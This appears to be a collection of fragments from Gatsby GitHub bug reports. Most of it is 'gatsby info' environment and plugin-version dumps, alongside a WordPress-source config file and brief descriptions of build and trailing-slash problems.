``` system: os: macos 10.14 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.4 - ~/.nvm/versions/node/v8.9.4/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.5.0 - ~/.nvm/versions/node/v8.9.4/bin/npm browsers: chrome: 71.0.3578.98 firefox: 57.0.4 safari: 12.0 npmpackages: gatsby: ^2.0.67 => 2.0.67 gatsby-image: ^2.0.25 => 2.0.25 gatsby-mdx: ^0.2.0 => 0.2.0 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.15 => 2.0.15 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-contentful: ^2.0.20 => 2.0.20 gatsby-transformer-sharp: ^2.1.9 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.6
```bash $ gatsby info --clipboard system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 11.3.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 71.0.3578.98 firefox: 63.0.3 safari: 12.0.2 npmpackages: gatsby: 2.0.67 => 2.0.67 npmglobalpackages: gatsby-cli: 2.4.6 ```
``` system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i5-6267u cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - /usr/local/opt/node@8/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/opt/node@8/bin/npm browsers: chrome: 71.0.3578.98 safari: 12.0.2 npmpackages: gatsby: ^2.0.19 => 2.0.67 gatsby-image: ^2.0.22 => 2.0.25 gatsby-paginate: ^1.0.16 => 1.0.16 gatsby-plugin-feed: ^2.0.8 => 2.0.11 gatsby-plugin-google-analytics: ^2.0.5 => 2.0.8 gatsby-plugin-manifest: ^2.0.5 => 2.0.12 gatsby-plugin-offline: ^2.0.5 => 2.0.19 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.4 gatsby-plugin-sharp: ^2.0.6 => 2.0.15 gatsby-plugin-typography: ^2.2.0 => 2.2.2 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.7 gatsby-remark-images: ^3.0.1 => 3.0.1 gatsby-remark-prismjs: ^3.0.0 => 3.1.4 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.7 gatsby-remark-smartypants: ^2.0.5 => 2.0.7 gatsby-source-filesystem: ^2.0.2 => 2.0.12 gatsby-transformer-remark: ^2.1.6 => 2.1.15 gatsby-transformer-sharp: ^2.1.3 => 2.1.9
``` so, this one is a really tricky one
if any of the above stated conditions are false, the build succeeds
the weirdest aspect to me is that if the image filename is just one character longer (so 30 characters instead of 29), the build succeeds
i realize that this is an incredibly specific set of conditions, but it's the smallest reproduction of this issue that i could get my project down to.
``` system: os: macos high sierra 10.13.2 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 8.12.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 71.0.3578.98 firefox: 63.0 safari: 11.0.2 npmpackages: gatsby: ^2.0.63 => 2.0.63 gatsby-image: ^2.0.22 => 2.0.22 gatsby-link: ^2.0.7 => 2.0.7 gatsby-plugin-catch-links: ^2.0.9 => 2.0.9 gatsby-plugin-feed: ^2.0.11 => 2.0.11 gatsby-plugin-google-analytics: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.0.11 => 2.0.11 gatsby-plugin-nprogress: ^2.0.7 => 2.0.7 gatsby-plugin-offline: ^2.0.18 => 2.0.18 gatsby-plugin-page-transitions: ^1.0.7 => 1.0.7 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.4 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.14 => 2.0.14 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-plugin-twitter: ^2.0.8 => 2.0.8 gatsby-remark-autolink-headers: ^2.0.12 => 2.0.12 gatsby-remark-copy-linked-files: ^2.0.7 => 2.0.7 gatsby-remark-images: ^3.0.1 => 3.0.1 gatsby-remark-prismjs: ^3.1.4 => 3.1.4 gatsby-remark-responsive-iframe: ^2.0.7 => 2.0.7 gatsby-source-filesystem: ^2.0.11 => 2.0.11 gatsby-source-wordpress: ^3.0.19 => 3.0.19 gatsby-transformer-remark: ^2.1.15 => 2.1.15 gatsby-transformer-sharp: ^2.1.9 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.5
gatsby-config.js ```
const config = require('./data/siteconfig') const pathprefix = config.pathprefix === '/' ? '' : config.pathprefix module.exports = { pathprefix: config.pathprefix, sitemetadata: { siteurl: config.siteurl + pathprefix, rssmetadata: { site_url: config.siteurl + pathprefix, feed_url: config.siteurl + pathprefix + config.siterss, title: config.sitetitle, description: config.sitedescription, image_url: `${config.siteurl + pathprefix}/logos/logo-512.png`, author: config.username, copyright: config.copyright } }, plugins: [ 'gatsby-plugin-sass', 'gatsby-plugin-react-helmet', //'gatsby-plugin-page-transitions', { resolve: 'gatsby-source-wordpress', options: { // the base url to your wp site
baseurl: 'si.mobydigg.de', // baseurl: 'wpgatsby.wtf', // wp.com sites set to true, wp.org set to false hostingwpcom: false, // the protocol
this can be http or https
protocol: \'http\', // use \'advanced custom fields\' wordpress plugin useacf: true, auth: {}, // set to true to debug endpoints on \'gatsby build\' verboseoutput: true, includedroutes: [ "/*/*/categories", "/*/*/posts", "/*/*/projects", "/*/*/jobs", "/*/*/pages", "/*/*/media", "/*/*/tags", "/*/*/taxonomies", "/*/*/menus" ], } }, \'gatsby-transformer-sharp\', \'gatsby-plugin-sharp\', // { // resolve: \'gatsby-plugin-google-analytics\', // options: { // trackingid: config.googleanalyticsid, // }, // }, { resolve: \'gatsby-plugin-nprogress\', options: { color: config.themecolor } }, \'gatsby-plugin-catch-links\', \'gatsby-plugin-sitemap\', { resolve: \'gatsby-plugin-manifest\', options: { name: config.sitetitle, short_name: config.sitetitle, description: config.sitedescription, start_url: config.pathprefix, background_color: config.backgroundcolor, theme_color: config.themecolor, display: \'minimal-ui\', icons: [ { src: \'/logos/logo-192x192.png\', sizes: \'192x192\', type: \'image/png\' }, { src: \'/logos/logo-512x512.png\', sizes: \'512x512\', type: \'image/png\' } ] } }, \'gatsby-plugin-offline\' ]
``` system: os: macos high sierra 10.13.2 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 8.12.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 71.0.3578.80 firefox: 63.0 safari: 11.0.2 npmpackages: gatsby: ^2.0.63 => 2.0.63 gatsby-image: ^2.0.22 => 2.0.22 gatsby-link: ^2.0.7 => 2.0.7 gatsby-plugin-catch-links: ^2.0.9 => 2.0.9 gatsby-plugin-feed: ^2.0.11 => 2.0.11 gatsby-plugin-google-analytics: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.0.11 => 2.0.11 gatsby-plugin-nprogress: ^2.0.7 => 2.0.7 gatsby-plugin-offline: ^2.0.18 => 2.0.18 gatsby-plugin-page-transitions: ^1.0.7 => 1.0.7 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.4 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.14 => 2.0.14 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-plugin-twitter: ^2.0.8 => 2.0.8 gatsby-remark-autolink-headers: ^2.0.12 => 2.0.12 gatsby-remark-copy-linked-files: ^2.0.7 => 2.0.7 gatsby-remark-images: ^3.0.1 => 3.0.1 gatsby-remark-prismjs: ^3.1.4 => 3.1.4 gatsby-remark-responsive-iframe: ^2.0.7 => 2.0.7 gatsby-source-filesystem: ^2.0.11 => 2.0.11 gatsby-source-wordpress: ^3.0.19 => 3.0.19 gatsby-transformer-remark: ^2.1.15 => 2.1.15 gatsby-transformer-sharp: ^2.1.9 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.5
chrome: 72.0.3626.7 firefox: 62.0 safari: 12.0.2 npmpackages: gatsby: ^2.0.63 => 2.0.63 gatsby-image: ^2.0.22 => 2.0.22 gatsby-plugin-emotion: ^3.0.1 => 3.0.1 gatsby-plugin-extract-schema: ^0.0.4 => 0.0.4 gatsby-plugin-manifest: ^2.0.11 => 2.0.11 gatsby-plugin-netlify: ^2.0.6 => 2.0.6 gatsby-plugin-offline: ^2.0.18 => 2.0.18 gatsby-plugin-polyfill-io: ^1.0.5 => 1.0.5 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.4 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.0.14 => 2.0.14 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-svg-sprite: ^2.0.1 => 2.0.1 gatsby-source-filesystem: ^2.0.10 => 2.0.10 gatsby-transformer-sharp: ^2.1.9 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.4
(not related to my env) ```
system: os: macos 10.14.1 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 2.7.1 - /usr/local/bin/fish binaries: node: 8.12.0 - /var/folders/w3/t46wpt4n12v37k6zn6xz03bm0000gn/t/yarn--1543923041098-0.9736292242640079/node yarn: 1.12.3 - /var/folders/w3/t46wpt4n12v37k6zn6xz03bm0000gn/t/yarn--1543923041098-0.9736292242640079/yarn npm: 6.4.1 - /usr/local/cellar/node@8/8.12.0/bin/npm browsers: chrome: 70.0.3538.110 firefox: 63.0.3 safari: 12.0.1 npmpackages: gatsby: ^2.0.61 => 2.0.61 gatsby-image: ^2.0.22 => 2.0.22 gatsby-plugin-compile-es6-packages: ^1.0.6 => 1.0.6 gatsby-plugin-favicon: ^3.1.4 => 3.1.4 gatsby-plugin-lodash: ^3.0.3 => 3.0.3 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.4 gatsby-plugin-robots-txt: ^1.0.2 => 1.3.0 gatsby-plugin-sharp: ^2.0.14 => 2.0.14 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-contentful: ^2.0.17 => 2.0.17 gatsby-source-filesystem: ^2.0.10 => 2.0.10 gatsby-transformer-csv: ^2.0.5 => 2.0.5 gatsby-transformer-json: ^2.1.6 => 2.1.6 gatsby-transformer-remark: ^2.1.15 => 2.1.15 gatsby-transformer-sharp: ^2.1.9 => 2.1.9
(if relevant) ``` system: os: macos 10.14.1 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 11.1.0 - ~/.nvm/versions/node/v11.1.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v11.1.0/bin/npm browsers: chrome: 70.0.3538.102 safari: 12.0.1 npmpackages: gatsby: ^2.0.19 => 2.0.55 gatsby-source-wordpress: ^3.0.15 => 3.0.15 npmglobalpackages: gatsby-cli: 2.4.5
``` ### file contents (if changed) `gatsby-config.js` ```javascript
module.exports = { plugins: [{ resolve: "gatsby-source-wordpress", options: { baseurl: process.env.wp_hostname, protocol: process.env.wp_protocol, auth: { htaccess_user: process.env.wp_htaccess_username, htaccess_pass: process.env.wp_htaccess_password }, useacf: true } }]
(if relevant) ```plain system: os: windows 10 cpu: x64 intel(r) core(tm) i7-7700 cpu @ 3.60ghz binaries: yarn: 1.12.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 4.0.5 - c:\\program files (x86)\ odist\\bin\ pm.exe browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.55 => 2.0.55 gatsby-plugin-catch-links: ^1.0.24 => 1.0.26 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-source-filesystem: ^1.5.39 => 1.5.39 gatsby-transformer-remark: ^2.1.12 => 2.1.12
``` ### file contents (if changed) todo <!--
`gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
chrome on mac mojave
version 70.0.3538.102 (official build) (64-bit)
``` system: os: macos 10.14.1 cpu: (4) x64 intel(r) core(tm) i5-6360u cpu @ 2.00ghz shell: 5.3 - /bin/zsh binaries: node: 11.2.0 - ~/.nvm/versions/node/v11.2.0/bin/node npm: 6.4.1 - ~/.nvm/versions/node/v11.2.0/bin/npm browsers: chrome: 70.0.3538.110 firefox: 63.0.3 safari: 12.0.1 npmpackages: gatsby: ^2.0.53 => 2.0.53 gatsby-image: ^2.0.20 => 2.0.20 gatsby-plugin-canonical-urls: ^2.0.7 => 2.0.7 gatsby-plugin-create-client-paths: ^2.0.2 => 2.0.2 gatsby-plugin-feed: ^2.0.9 => 2.0.9 gatsby-plugin-gtag: ^1.0.4 => 1.0.4 gatsby-plugin-manifest: ^2.0.9 => 2.0.9 gatsby-plugin-netlify: ^2.0.5 => 2.0.5 gatsby-plugin-netlify-cache: ^1.0.0 => 1.0.0 gatsby-plugin-netlify-cms: ^3.0.7 => 3.0.7 gatsby-plugin-no-sourcemaps: ^2.0.1 => 2.0.1 gatsby-plugin-offline: ^2.0.16 => 2.0.16 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.2 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sharp: ^2.0.12 => 2.0.12 gatsby-plugin-sitemap: ^2.0.2 => 2.0.2 gatsby-plugin-styled-components: ^3.0.3 => 3.0.3 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-source-filesystem: ^2.0.8 => 2.0.8 gatsby-transformer-remark: ^2.1.12 => 2.1.12 gatsby-transformer-sharp: ^2.1.8 => 2.1.8 npmglobalpackages: gatsby-cli: 2.4.5
system: os: macos high sierra 10.13.4 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 9.4.0 - /usr/local/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 6.3.0 - /usr/local/bin/npm browsers: chrome: 70.0.3538.102 firefox: 63.0 safari: 11.1 npmpackages: gatsby: ^2.0.19 => 2.0.48 gatsby-image: ^2.0.15 => 2.0.20 gatsby-plugin-manifest: ^2.0.5 => 2.0.9 gatsby-plugin-offline: ^2.0.11 => 2.0.14 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.2 gatsby-plugin-sharp: ^2.0.7 => 2.0.12 gatsby-plugin-styled-components: ^3.0.1 => 3.0.1 gatsby-source-filesystem: ^2.0.4 => 2.0.8 gatsby-transformer-sharp: ^2.1.4 => 2.1.8
``` system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 8.12.0 - ~/.nvm/versions/node/v8.12.0/bin/node yarn: 1.12.3 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v8.12.0/bin/npm browsers: firefox: 63.0 npmpackages: gatsby: ^2.0.19 => 2.0.47 gatsby-image: ^2.0.15 => 2.0.20 gatsby-plugin-manifest: ^2.0.5 => 2.0.9 gatsby-plugin-offline: ^2.0.11 => 2.0.13 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.2 gatsby-plugin-sass: ^2.0.4 => 2.0.4 gatsby-plugin-sharp: ^2.0.7 => 2.0.12 gatsby-plugin-styled-components: ^3.0.1 => 3.0.1 gatsby-source-filesystem: ^2.0.4 => 2.0.8 gatsby-transformer-sharp: ^2.1.4 => 2.1.8 ```
``` system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 8.12.0 - /usr/local/bin/node npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 70.0.3538.102 firefox: 63.0 safari: 12.0 npmpackages: gatsby: ^2.0.47 => 2.0.47 gatsby-source-contentful: ^2.0.14 => 2.0.14
``` system: os: macos 10.14.1 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm browsers: chrome: 70.0.3538.77 firefox: 63.0.1 safari: 12.0.1 npmpackages: gatsby: ^2.0.44 => 2.0.44 ```
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 2.7.1 - /usr/local/bin/fish binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 70.0.3538.77 firefox: 63.0 safari: 12.0 npmpackages: gatsby: ^2.0.37 => 2.0.37 gatsby-image: ^2.0.19 => 2.0.19 gatsby-plugin-favicon: ^3.1.4 => 3.1.4 gatsby-plugin-manifest: ^2.0.7 => 2.0.7 gatsby-plugin-offline: ^2.0.11 => 2.0.11 gatsby-plugin-react-helmet: ^3.0.1 => 3.0.1 gatsby-plugin-sharp: ^2.0.11 => 2.0.11 gatsby-plugin-styled-components: ^3.0.1 => 3.0.1 gatsby-plugin-typography: ^2.2.1 => 2.2.1 gatsby-source-drupal: ^3.0.7 => 3.0.7 gatsby-source-filesystem: ^2.0.7 => 2.0.7 gatsby-transformer-sharp: ^2.1.7 => 2.1.7 npmglobalpackages: gatsby-cli: 2.4.4
``` system: os: macos 10.14.1 cpu: x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 2.7.1 - /usr/local/bin/fish binaries: node: 11.1.0 - /usr/local/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 70.0.3538.77 firefox: 63.0 safari: 12.0.1 npmpackages: gatsby: ^2.0.19 => 2.0.19 gatsby-image: ^2.0.15 => 2.0.15 gatsby-plugin-manifest: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.7 => 2.0.7 gatsby-source-drupal: ^3.0.7 => 3.0.7 gatsby-source-filesystem: ^2.0.4 => 2.0.4 gatsby-transformer-sharp: ^2.1.4 => 2.1.4 npmglobalpackages: gatsby-cli: 2.4.4
``` let me know if there's any additional information i can provide or steps i can take to help trouble shoot this issue.
system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 10.6.0 - ~/.nvm/versions/node/v10.6.0/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.6.0/bin/npm browsers: chrome: 70.0.3538.77 firefox: 62.0 safari: 12.0 npmpackages: gatsby: ^2.0.19 => 2.0.38 gatsby-image: ^2.0.15 => 2.0.19 gatsby-plugin-manifest: ^2.0.5 => 2.0.7 gatsby-plugin-offline: ^2.0.5 => 2.0.11 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.1 gatsby-plugin-sharp: ^2.0.7 => 2.0.11 gatsby-source-filesystem: ^2.0.4 => 2.0.7 gatsby-transformer-sharp: ^2.1.4 => 2.1.7 npmglobalpackages: gatsby-cli: 2.4.3
``` thanks!!
i am using ubnuntu 16.04 on google chrome browser not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
production.
this behavior is visible on the website.
i am unable to post info due to #8502
however, i am running `gatsby-cli` version 2.4.4 (globally installed), and `gatsby` version 2.0.35.
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i5-7287u cpu @ 3.30ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.5.1 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.31 gatsby-image: ^2.0.5 => 2.0.17 gatsby-plugin-catch-links: ^2.0.2 => 2.0.5 gatsby-plugin-glamor: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.0.5 => 2.0.8 gatsby-plugin-typography: ^2.2.0 => 2.2.0 gatsby-remark-autolink-headers: ^2.0.5 => 2.0.8 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.5 gatsby-remark-images: ^2.0.1 => 2.0.4 gatsby-remark-katex: ^2.0.5 => 2.0.5 gatsby-remark-prismjs: ^3.0.0 => 3.0.2 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.5 gatsby-remark-smartypants: ^2.0.5 => 2.0.5 gatsby-source-filesystem: ^2.0.1 => 2.0.5 gatsby-transformer-remark: ^2.1.1 => 2.1.9 gatsby-transformer-sharp: ^2.1.1 => 2.1.5 gatsby-transformer-yaml: ^2.1.1 => 2.1.3 npmglobalpackages: gatsby-cli: 2.4.3
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 firefox: 52.0.2 safari: 12.0 npmpackages: gatsby: ^2.0.5 => 2.0.9 gatsby-image: ^2.0.5 => 2.0.10 gatsby-plugin-accessibilityjs: 1.0.3 => 1.0.3 gatsby-plugin-google-tagmanager: 2.0.5 => 2.0.5 gatsby-plugin-manifest: 2.0.5 => 2.0.2 gatsby-plugin-react-helmet: 3.0.0 => 3.0.0 gatsby-plugin-robots-txt: 1.3.0 => 1.3.0 gatsby-plugin-sass: 2.0.1 => 2.0.1 gatsby-plugin-sharp: ^2.0.5 => 2.0.5 gatsby-plugin-styled-components: 3.0.0 => 3.0.0 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-transformer-sharp: ^2.1.1 => 2.1.2 npmglobalpackages: gatsby-cli: 2.4.3
system: os: macos 10.14 cpu: x64 intel(r) core(tm) i5-7500 cpu @ 3.40ghz shell: 5.3 - /bin/zsh binaries: node: 10.12.0 - /usr/local/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0.2 safari: 12.0 npmpackages: gatsby: ^2.0.19 => 2.0.19 gatsby-image: ^2.0.15 => 2.0.15 gatsby-plugin-manifest: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.7 => 2.0.7 gatsby-plugin-subfont: ^1.0.1 => 1.0.1 gatsby-source-filesystem: ^2.0.4 => 2.0.4 gatsby-transformer-sharp: ^2.1.4 => 2.1.4 npmglobalpackages: gatsby-cli: 2.4.3
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
system: os: windows 10 cpu: x64 intel(r) core(tm) i7-5600u cpu @ 2.60ghz binaries: yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.5.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.19 => 2.0.21 gatsby-plugin-catch-links: ^2.0.4 => 2.0.4 gatsby-plugin-emotion: ^2.0.5 => 2.0.5 gatsby-plugin-google-analytics: ^2.0.6 => 2.0.6 gatsby-plugin-manifest: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.6 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.6 => 2.0.6 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-images: ^2.0.4 => 2.0.4 gatsby-source-filesystem: ^2.0.3 => 2.0.3 gatsby-transformer-remark: ^2.1.7 => 2.1.7
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-6920hq cpu @ 2.90ghz shell: 5.6 - /usr/local/bin/zsh binaries: node: 9.4.0 - ~/.nvm/versions/node/v9.4.0/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v9.4.0/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0.1 safari: 11.1 npmpackages: gatsby: 2.0.18 => 2.0.18 gatsby-image: 2.0.11 => 2.0.11 gatsby-plugin-eslint: 2.0.1 => 2.0.1 gatsby-plugin-manifest: 2.0.2 => 2.0.2 gatsby-plugin-offline: 2.0.5 => 2.0.5 gatsby-plugin-polyfill-io: 1.0.5 => 1.0.5 gatsby-plugin-react-helmet: 3.0.0 => 3.0.0 gatsby-plugin-root-import: 2.0.4 => 2.0.4 gatsby-plugin-sharp: 2.0.5 => 2.0.5 gatsby-plugin-styled-components: 3.0.0 => 3.0.0 gatsby-plugin-webpack-size: 0.0.2 => 0.0.2 gatsby-react-router-scroll: 2.0.0 => 2.0.0 gatsby-source-contentful: 2.0.3 => 2.0.3 gatsby-source-ghost: 2.1.2 => 2.1.2 gatsby-transformer-remark: 2.1.7 => 2.1.7 gatsby-transformer-sharp: 2.1.3 => 2.1.3 npmglobalpackages: gatsby-cli: 2.4.2
(if relevant) same behaviour in gatsby v1 and v2.
i'm using [gatsby-plugin-remove-trailing-slashes]( and [gatsby-plugin-netlify](
within the project all links point to the non-trailing slash version.
cannot get gatsby info because of #8502.
iphone xs, chrome
2015 macbook pro, chrome incognito
able to reproduce here:
firefox 62.0.3 (64-bit)
macos high sierra version 10.13.6
(if relevant) <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 10.4.1 - ~/.nvm/versions/node/v10.4.1/bin/node yarn: 1.7.0 - ~/.nvm/versions/node/v10.4.1/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.4.1/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0.2 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.22 gatsby-image: ^2.0.0 => 2.0.14 gatsby-plugin-google-analytics: ^2.0.0 => 2.0.6 gatsby-plugin-less: ^2.0.0 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.0.0 => 2.0.1 gatsby-plugin-sharp: ^2.0.6 => 2.0.6 gatsby-plugin-styled-components: ^3.0.0 => 3.0.0 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-remark-copy-linked-files: ^2.0.0 => 2.0.5 gatsby-remark-images: ^2.0.0 => 2.0.4 gatsby-remark-prismjs: ^3.0.0 => 3.0.2 gatsby-source-filesystem: ^2.0.3 => 2.0.3 gatsby-transformer-json: ^2.1.4 => 2.1.4 gatsby-transformer-remark: ^2.1.7 => 2.1.7 gatsby-transformer-sharp: ^2.1.3 => 2.1.3 gatsby-transformer-yaml: ^2.1.3 => 2.1.3 npmglobalpackages: gatsby-cli: 2.4.2 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: windows 10 cpu: x64 intel(r) core(tm) i7-5600u cpu @ 2.60ghz binaries: yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.5.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.19 => 2.0.21 gatsby-plugin-catch-links: ^2.0.4 => 2.0.4 gatsby-plugin-emotion: ^2.0.5 => 2.0.5 gatsby-plugin-google-analytics: ^2.0.6 => 2.0.6 gatsby-plugin-manifest: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.6 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.6 => 2.0.6 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-images: ^2.0.4 => 2.0.4 gatsby-source-filesystem: ^2.0.3 => 2.0.3 gatsby-transformer-remark: ^2.1.7 => 2.1.7
